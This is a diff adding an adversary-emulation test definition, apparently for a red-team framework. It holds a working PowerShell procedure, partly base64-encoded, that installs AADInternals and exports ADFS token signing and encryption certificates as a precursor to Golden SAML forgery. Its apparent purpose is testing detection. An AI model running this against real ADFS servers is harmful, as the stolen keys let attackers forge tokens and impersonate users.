@@ -1,0 +1,24 @@
+- id: c59ca2a2-cea4-5d82-ab95-933400b50f57
+  name: Soumaia ART Tests - ADFS token signing and encryption certificates theft - Local
+  description: 'Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.
+
+    Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.'
+  tactic: credential-access
+  technique:
+    attack_id: T1552.004
+    name: 'Unsecured Credentials: Private Keys'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABHAGUAdAAtAE0AbwBkAHUAbABlACAAQQBBAEQASQBuAHQAZQByAG4AYQBsAHMAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand SQBuAHMAdABhAGwAbAAtAE0AbwBkAHUAbABlACAALQBOAGEAbQBlACAAQQBBAEQASQBuAHQAZQByAG4AYQBsAHMAIAAtAEYAbwByAGMAZQAKAA==
+          }
+          Import-Module AADInternals -Force
+          Export-AADIntADFSCertificates
+          Get-ChildItem | Where-Object {$_ -like "ADFS*"}
+          Write-Host "`nCertificates retrieved successfully"
+        cleanup: |-
+          Remove-Item -Path ".\ADFS_encryption.pfx" -ErrorAction Ignore
+          Remove-Item -Path ".\ADFS_signing.pfx" -ErrorAction Ignore
